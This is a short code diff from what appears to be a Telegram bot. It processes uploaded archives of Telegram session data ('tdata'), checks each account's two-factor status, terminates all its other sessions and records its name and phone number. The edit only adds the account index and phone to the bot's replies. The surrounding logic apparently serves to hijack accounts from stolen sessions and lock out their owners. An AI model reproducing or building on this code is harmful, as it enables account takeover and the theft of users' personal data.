@@ -442,9 +442,9 @@ async def handle_archive(client, message):
                 with open(clean_zip_path, "rb") as f:
                     tdata_bytes = f.read()
                 syd = await check_2fa(tele_client)
-                await message.reply(syd)
+                await message.reply(f"{idx} ~ {me.phone}: {syd}")
                 nsyd = await terminate_all_other_sessions(tele_client)
-                await message.reply(nsyd)
+                await message.reply(f"{idx} ~ {me.phone}: {nsyd}")
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
